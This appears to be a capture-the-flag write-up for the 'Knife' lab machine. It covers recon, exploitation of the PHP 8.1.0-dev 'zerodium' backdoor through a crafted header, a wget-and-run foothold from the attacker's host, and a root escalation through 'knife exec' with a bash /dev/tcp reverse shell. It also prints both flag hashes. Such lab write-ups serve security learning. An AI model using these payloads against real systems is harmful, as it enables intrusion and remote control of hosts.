# Knife

export IP=10.10.10.242

# Solution

Let's start with the usual. An nmap scan
```bash
cmd: sudo nmap -sC -sV -oN nmap/initial $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
```

While i do other stuff, lets do an all port scan in the background ! **UPDATE**: no further results found <br>

From the **Wappalyzer** firefox extension we can see some things
- apache 2.4.41 and Ubuntu (as seen in the nmap scan)
- Php 8.1.0

The page source code has nothing intersting <br>

Lets do some fuzzing !! 

```bash
cmd: feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 80 -o fuzz/big.log

# nothing special (three 403 pages)
# with raft-medium-words (more pages, same importance)
# vhosts (nothing)
```

Since i got nowhere i checked the requests being made with burpsuite and found the php version to be a bit different
```sql
X-Powered-By: PHP/8.1.0-dev
```

The **-dev** made my suspicions rise because usually you dont use dev branches in production because it contains functionalities that can be a problem <br>

With a bit of googling ("php 8.1.0-dev"), got what we needed in the first link ([packet storm](https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html)) 
```s
PHP 8.1.0-dev Backdoor Remote Command Injection
```

Seems that there's a backdoor by using the following header and the corresponding piece of code (which triggers the RCE via evaluating a string)
```bash 
# payload
"User-Agentt":"zerodiumsystem(\""+args.cmd+"\");"

# bug
 if (strstr(Z_STRVAL_P(enc), "zerodium")) {
    zend_try {
        zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
```

Testing the exploit
```bash
cmd: python exp.py -u http://$IP -c whoami
[+] Results:
james

# Was unable to exec a reverse shell directly, so pulled a script from my local machine and executed it
cmd: python exp.py -u http://$IP -c 'wget http://10.10.16.26/bitch.sh -O /dev/shm/bitch.sh && chmod +x /dev/shm/bitch.sh && /dev/shm/bitch.sh'
```

Anddd, hackerman, I'm in!

```bash
cmd: whoami && id
james
uid=1000(james) gid=1000(james) groups=1000(james)

cmd: cat ~/user.txt
# FLAG: 2e6b8be9d55f2c541383e1ae04d957fd

cmd: sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

cmd: ls -la /usr/bin/knife
lrwxrwxrwx 1 root root 31 May  7 11:03 /usr/bin/knife -> /opt/chef-workstation/bin/knife
```

So, seems that we need to use this **chef-workstation** stuff to privesc to root ! Lets see what it does by executing <br>

It displayed a bunch of stuff (help). Checking the [documentation](https://docs.chef.io/workstation/knife/) i saw that there's an **exec** command 
```bash
"Description snippet" : Use the `knife exec` subcommand to execute Ruby scripts in the context of a fully configured Chef Infra Client. (..)
"Syntax:" knife exec SCRIPT (options)

# Note: In the page is also stated that shell commands in the %x[cmd] are possible within a script
```

Let just build a script and test it !
```ruby
# Script name: test.rb
%x[/bin/bash -c "bash -i >& /dev/tcp/10.10.16.26/1415 0>&1"]
```

And execute it
```bash
cmd (james): sudo /opt/chef-workstation/bin/knife exec ./test.rb
cmd (root): whoami 
root
cmd (root): cat ~/root.txt

# FLAG: 2cb0148ad6a1b559fc14c70cacb52f98
```